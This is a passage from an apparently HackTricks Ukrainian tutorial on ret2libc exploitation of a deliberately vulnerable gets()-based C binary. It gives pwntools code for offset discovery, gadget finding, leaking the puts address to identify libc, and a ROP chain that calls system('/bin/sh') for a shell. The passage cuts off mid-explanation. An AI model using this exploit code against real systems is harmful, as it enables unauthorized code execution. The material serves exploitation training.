<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>


# –®–≤–∏–¥–∫–∏–π –æ–≥–ª—è–¥

1. **–ó–Ω–∞–π–¥—ñ—Ç—å** –∑–º—ñ—â–µ–Ω–Ω—è **–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è**
2. **–ó–Ω–∞–π–¥—ñ—Ç—å** –≥–∞–¥–∂–µ—Ç–∏ `POP_RDI`, `PUTS_PLT` —Ç–∞ `MAIN_PLT`
3. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è **–≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ** puts –∞–±–æ —ñ–Ω—à–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó libc —Ç–∞ **–∑–Ω–∞–π–¥—ñ—Ç—å –≤–µ—Ä—Å—ñ—é libc** ([–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —ó—ó](https://libc.blukat.me))
4. –ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–æ—é **–æ–±—á–∏—Å–ª—ñ—Ç—å ROP —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –π–æ–≥–æ**

# –Ü–Ω—à—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏ —Ç–∞ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ –¥–ª—è –ø—Ä–∞–∫—Ç–∏–∫–∏

–£ —Ü—å–æ–º—É –ø–æ—Å—ñ–±–Ω–∏–∫—É –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –∫–æ–¥/–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π —É —Ü—å–æ–º—É –ø–æ—Å—ñ–±–Ω–∏–∫—É: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
–Ü–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# –ö–æ–¥

–Ü–º'—è —Ñ–∞–π–ª—É: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - –í–∏—Ç—ñ–∫ —à–∞–±–ª–æ–Ω—É LIBC

–Ø –∑–±–∏—Ä–∞—é—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –∫–æ–¥, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π —Ç—É—Ç, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç.\
–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –µ–∫—Å–ø–ª–æ–π—Ç —Ç–∞ –ø–æ–º—ñ—Å—Ç—ñ—Ç—å –π–æ–≥–æ –≤ —Ç—É —Å–∞–º—É —Ç–µ–∫—É, —â–æ —ñ –≤—Ä–∞–∑–ª–∏–≤–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —ñ –Ω–∞–¥–∞–π—Ç–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç—É:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- –ü–æ—à—É–∫ –∑—Å—É–≤—É

–®–∞–±–ª–æ–Ω –ø–æ—Ç—Ä–µ–±—É—î –∑—Å—É–≤—É –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º –µ–∫—Å–ø–ª–æ–π—Ç—É. –Ø–∫—â–æ –Ω—ñ—è–∫–∏–π –Ω–µ –Ω–∞–¥–∞–Ω–∏–π, –≤—ñ–Ω –≤–∏–∫–æ–Ω–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ –¥–ª—è –π–æ–≥–æ –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**–í–∏–∫–æ–Ω–∞–π—Ç–µ** `python template.py`, –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è –∫–æ–Ω—Å–æ–ª—å GDB –∑—ñ –∑–±–æ—î–º –ø—Ä–æ–≥—Ä–∞–º–∏. –£ —Ü—ñ–π **–∫–æ–Ω—Å–æ–ª—ñ GDB** –≤–∏–∫–æ–Ω–∞–π—Ç–µ `x/wx $rsp`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–±–∞–π—Ç–∏**, —è–∫—ñ –±—É–¥—É—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ RIP. –ù–∞—Ä–µ—à—Ç—ñ, –æ—Ç—Ä–∏–º–∞–π—Ç–µ **–∑—Å—É–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–∫–æ–Ω—Å–æ–ª—ñ Python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

–ü—ñ—Å–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∑—Å—É–≤—É (—É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É 40) –∑–º—ñ–Ω—ñ—Ç—å –∑–º—ñ–Ω–Ω—É OFFSET –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —à–∞–±–ª–æ–Ω—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ –∑–Ω–∞—á–µ–Ω–Ω—è.\
`OFFSET = "A" * 40`

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏: `pattern create 1000` -- _–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ ret_ -- `pattern seach $rsp` –∑ GEF.

# 2- –ü–æ—à—É–∫ –≥–∞–¥–∂–µ—Ç—ñ–≤

–¢–µ–ø–µ—Ä –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –≥–∞–¥–∂–µ—Ç–∏ ROP –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –¶—ñ –≥–∞–¥–∂–µ—Ç–∏ ROP –±—É–¥—É—Ç—å –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤–∏–∫–ª–∏–∫—É `puts` –¥–ª—è –ø–æ—à—É–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–æ—ó **libc**, –∞ –ø—ñ–∑–Ω—ñ—à–µ –¥–ª—è **–∑–∞–ø—É—Å–∫—É –∫—ñ–Ω—Ü–µ–≤–æ—ó –∞—Ç–∞–∫–∏**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –≤–∏–∫–ª–∏–∫—É **—Ñ—É–Ω–∫—Ü—ñ—ó puts**.\
`MAIN_PLT` –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –≤–∏–∫–ª–∏–∫—É **–≥–æ–ª–æ–≤–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó** –∑–Ω–æ–≤—É –ø—ñ—Å–ª—è –æ–¥–Ω–æ–≥–æ –≤–∑–∞—î–º–æ–¥—ñ—ó –¥–ª—è **–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó** –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è **–∑–Ω–æ–≤—É** (–±–µ–∑–∫—ñ–Ω–µ—á–Ω—ñ —Ä–∞—É–Ω–¥–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó). **–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∫—ñ–Ω—Ü—ñ –∫–æ–∂–Ω–æ–≥–æ ROP –¥–ª—è –≤–∏–∫–ª–∏–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏ –∑–Ω–æ–≤—É**.\
**POP\_RDI** –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è **–ø–µ—Ä–µ–¥–∞—á—ñ** **–ø–∞—Ä–∞–º–µ—Ç—Ä–∞** —É –≤–∏–∫–ª–∏–∫–∞–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é.

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –Ω—ñ—á–æ–≥–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å–µ –±—É–¥–µ –∑–Ω–∞–π–¥–µ–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é pwntools –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

# 3- –ü–æ—à—É–∫ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ LIBC

–¢–µ–ø–µ—Ä —á–∞—Å –∑–Ω–∞–π—Ç–∏, —è–∫–∞ –≤–µ—Ä—Å—ñ—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **libc** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –î–ª—è —Ü—å–æ–≥–æ –º–∏ –∑–±–∏—Ä–∞—î–º–æ—Å—è **–≤–∏—Ç—ñ–∫–∞—Ç–∏** **–∞–¥—Ä–µ—Å—É** –≤ –ø–∞–º'—è—Ç—ñ —Ñ—É–Ω–∫—Ü—ñ—ó `puts`, –∞ –ø–æ—Ç—ñ–º –º–∏ –∑–±–∏—Ä–∞—î–º–æ—Å—è **—à—É–∫–∞—Ç–∏**, –≤ —è–∫—ñ–π **–≤–µ—Ä—Å—ñ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤–µ—Ä—Å—ñ—è puts –∑–∞ —Ü—ñ—î—é –∞–¥—Ä–µ—Å–æ—é.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
–î–ª—è —Ü—å–æ–≥–æ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏–º —Ä—è–¥–∫–æ–º –≤–∏–∫–æ–Ω–∞–Ω–æ–≥–æ –∫–æ–¥—É —î:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
–¶–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –¥–µ—è–∫—ñ –±–∞–π—Ç–∏, –ø–æ–∫–∏ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–Ω—è** **RIP** –Ω–µ —Å—Ç–∞–Ω–µ –º–æ–∂–ª–∏–≤–∏–º: `OFFSET`.\
–ü–æ—Ç—ñ–º –≤–æ–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å **–∞–¥—Ä–µ—Å—É** –≥–∞–¥–∂–µ—Ç–∞ `POP_RDI`, —â–æ–± –Ω–∞—Å—Ç—É–ø–Ω–∞ –∞–¥—Ä–µ—Å–∞ (`FUNC_GOT`) –±—É–ª–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ —Ä–µ—î—Å—Ç—Ä—ñ **RDI**. –¶–µ —Ç–æ–º—É, —â–æ –º–∏ —Ö–æ—á–µ–º–æ **–≤–∏–∫–ª–∏–∫–∞—Ç–∏ puts**, –ø–µ—Ä–µ–¥–∞—é—á–∏ –π–æ–º—É **–∞–¥—Ä–µ—Å—É** `PUTS_GOT` —è–∫ –∞–¥—Ä–µ—Å—É –≤ –ø–∞–º'—è—Ç—ñ —Ñ—É–Ω–∫—Ü—ñ—ó puts, —è–∫–∞ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î `PUTS_GOT`.\
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ `PUTS_PLT` (–∑ `PUTS_GOT` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **RDI**), —Ç–æ–º—É puts –±—É–¥–µ **—á–∏—Ç–∞—Ç–∏ –≤–º—ñ—Å—Ç** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `PUTS_GOT` (**–∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó puts –≤ –ø–∞–º'—è—Ç—ñ**) —ñ **–≤–∏–≤–µ–¥–µ —ó—ó**.\
–ù–∞—Ä–µ—à—Ç—ñ, –∑–Ω–æ–≤—É –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è **–≥–æ–ª–æ–≤–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è**, —â–æ–± –º–∏ –º–æ–≥–ª–∏ –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∏ **–æ–±–º–∞–Ω—É–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—é puts**, —â–æ–± –≤–æ–Ω–∞ **–≤–∏–≤–µ–ª–∞** **–∞–¥—Ä–µ—Å—É** –≤ **–ø–∞–º'—è—Ç—ñ** —Ñ—É–Ω–∫—Ü—ñ—ó **puts** (—è–∫–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ **libc**). –¢–µ–ø–µ—Ä, –∫–æ–ª–∏ —É –Ω–∞—Å —î —Ü—è –∞–¥—Ä–µ—Å–∞, –º–∏ –º–æ–∂–µ–º–æ **–∑'—è—Å—É–≤–∞—Ç–∏, —è–∫–∞ –≤–µ—Ä—Å—ñ—è libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è**.

![](<../../../.gitbook/assets/image (141).png>)

–û—Å–∫—ñ–ª—å–∫–∏ –º–∏ **–µ–∫—Å–ø–ª—É–∞—Ç—É—î–º–æ** –¥–µ—è–∫–∏–π **–ª–æ–∫–∞–ª—å–Ω–∏–π** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ** –≤–∏–∑–Ω–∞—á–∞—Ç–∏, —è–∫–∞ –≤–µ—Ä—Å—ñ—è **libc** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (–ø—Ä–æ—Å—Ç–æ –∑–Ω–∞–π–¥—ñ—Ç—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –≤ `/lib/x86_64-linux-gnu/libc.so.6`).\
–ê–ª–µ –≤ —Ä–∞–∑—ñ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —è –ø–æ—è—Å–Ω—é, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏:

## 3.1- –ü–æ—à—É–∫ –≤–µ—Ä—Å—ñ—ó libc (1)

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏, —è–∫–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ: [https://libc.blukat.me/](https://libc.blukat.me)\
–¶–µ —Ç–∞–∫–æ–∂ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–∏—è–≤–ª–µ–Ω—É –≤–µ—Ä—Å—ñ—é **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- –ü–æ—à—É–∫ –≤–µ—Ä—Å—ñ—ó libc (2)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

–¶–µ –∑–∞–π–º–µ –¥–µ—è–∫–∏–π —á–∞—Å, –±—É–¥—å—Ç–µ —Ç–µ—Ä–ø–ª—è—á—ñ.\
–î–ª—è —Ç–æ–≥–æ, —â–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ:

* –Ü–º'—è —Å–∏–º–≤–æ–ª—É libc: `puts`
* –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ libc: `0x7ff629878690`

–ú–∏ –º–æ–∂–µ–º–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —è–∫–∞ **libc** –Ω–∞–π—ñ–º–æ–≤—ñ—Ä–Ω—ñ—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
–ú–∏ –æ—Ç—Ä–∏–º—É—î–º–æ 2 –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ (–≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –¥—Ä—É–≥—É, —è–∫—â–æ –ø–µ—Ä—à–∞ –Ω–µ –ø—Ä–∞—Ü—é—î). –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø–µ—Ä—à–∏–π:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
–°–∫–æ–ø—ñ—é–π—Ç–µ libc –∑ `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` –≤ –Ω–∞—à —Ä–æ–±–æ—á–∏–π –∫–∞—Ç–∞–ª–æ–≥.

## 3.3- –Ü–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –≤–∏—Ç–æ–∫—É
```python
puts
printf
__libc_start_main
read
gets
```
# 4- –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ libc —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞—Ç–∏, —è–∫—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É libc –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—î–º–æ –ª–æ–∫–∞–ª—å–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º—É –ª–∏—à–µ: `/lib/x86_64-linux-gnu/libc.so.6`

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –Ω–∞ –ø–æ—á–∞—Ç–∫—É `template.py` –∑–º—ñ–Ω—ñ—Ç—å –∑–º—ñ–Ω–Ω—É **libc** –Ω–∞: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

–ù–∞–¥–∞–≤—à–∏ **—à–ª—è—Ö –¥–æ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ libc**, —Ä–µ—à—Ç–∞ **–µ–∫—Å–ø–ª–æ–π—Ç—É –±—É–¥–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Ä–æ–∑—Ä–∞—Ö–æ–≤–∞–Ω–∞**.

–£ —Ñ—É–Ω–∫—Ü—ñ—ó `get_addr` –±—É–¥–µ —Ä–æ–∑—Ä–∞—Ö–æ–≤–∞–Ω–∞ **–±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–∫—ñ–Ω—Ü–µ–≤–∞ –±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ libc –ø–æ–≤–∏–Ω–Ω–∞ –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è –Ω–∞ 00**. –Ø–∫—â–æ —Ü–µ –Ω–µ –≤–∞—à –≤–∏–ø–∞–¥–æ–∫, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –≤–∏—Ç—ñ–∫–∞–ª–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É.
{% endhint %}

–ü–æ—Ç—ñ–º –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó `system` —Ç–∞ **–∞–¥—Ä–µ—Å–∞** —Ä—è–¥–∫–∞ _"/bin/sh"_ –±—É–¥—É—Ç—å **–æ–±—á–∏—Å–ª–µ–Ω—ñ** –≤—ñ–¥ **–±–∞–∑–æ–≤–æ—ó –∞–¥—Ä–µ—Å–∏** **libc** —Ç–∞ –∑–∞–¥–∞–Ω—ñ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–æ—é libc**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
–ù–∞—Ä–µ—à—Ç—ñ, –µ–∫—Å–ø–ª–æ–π—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è /bin/sh –±—É–¥–µ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∏–π –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
–î–∞–≤–∞–π—Ç–µ –ø–æ—è—Å–Ω–∏–º —Ü–µ–π –æ—Å—Ç–∞–Ω–Ω—ñ–π ROP.\
–û—Å—Ç–∞–Ω–Ω—ñ–π ROP (`rop1`) –∑–∞–≤–µ—Ä—à–∏–≤—Å—è –≤–∏–∫–ª–∏–∫–æ–º —Ñ—É–Ω–∫—Ü—ñ—ó main –∑–Ω–æ–≤—É, —Ç–æ–¥—ñ –º–∏ –º–æ–∂–µ–º–æ **–∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏** **–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è** (–æ—Å—å —á–æ–º—É —Ç—É—Ç –∑–Ω–æ–≤—É —î `OFFSET`). –ü–æ—Ç—ñ–º –º–∏ —Ö–æ—á–µ–º–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `POP_RDI`, —Å–ø—Ä—è–º–æ–≤—É—é—á–∏ –Ω–∞ **–∞–¥—Ä–µ—Å—É** _"/bin/sh"_ (`BINSH`) —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **system** (`SYSTEM`), –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∞ 